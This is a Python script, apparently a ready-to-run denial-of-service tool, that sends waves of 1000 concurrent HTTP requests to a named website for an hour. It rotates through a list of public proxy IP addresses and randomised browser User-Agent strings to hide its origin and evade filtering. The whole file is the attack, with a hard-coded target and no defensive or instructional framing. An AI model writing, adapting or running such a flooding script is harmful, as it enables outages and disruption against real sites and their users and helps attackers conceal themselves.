import asyncio
import aiohttp
import random
import time

# Target URL
target_url = "https://thooto.com"

# Number of requests to send concurrently
concurrent_requests = 1000

# Duration of the attack in seconds
duration = 3600  # 1 hour

# List of proxy servers (if you want to rotate IPs)
proxies = [
    "http://50.174.7.162:80",
    "http://172.232.180.108:80",
    "http://195.23.57.78:80",
    "http://154.203.132.55:8090",
    "http://23.247.136.245:80",
    "http://181.41.194.186:80",
    "http://139.162.78.109:8080",
    "http://24.205.201.186:80",
    "http://116.203.28.43:80",
    "http://50.169.37.50:80"
]

# List of User-Agent strings to simulate different browsers/devices
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
    # Add more user agents here
]

async def send_request(session):
    # Randomly select a User-Agent
    headers = {
        "User-Agent": random.choice(user_agents)
    }

    # Optionally select a random proxy
    proxy = random.choice(proxies) if proxies else None

    try:
        async with session.get(target_url, headers=headers, proxy=proxy) as response:
            print(f"Status Code: {response.status}")
            # Random delay between requests to simulate real user behavior
            await asyncio.sleep(random.uniform(0.1, 2.0))
    except Exception as e:
        print(f"Request failed: {e}")

async def attack():
    timeout = aiohttp.ClientTimeout(total=None)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        end_time = time.time() + duration
        tasks = []
        while time.time() < end_time:
            for _ in range(concurrent_requests):
                task = asyncio.ensure_future(send_request(session))
                tasks.append(task)
            await asyncio.gather(*tasks)

# Run the attack
loop = asyncio.get_event_loop()
loop.run_until_complete(attack())

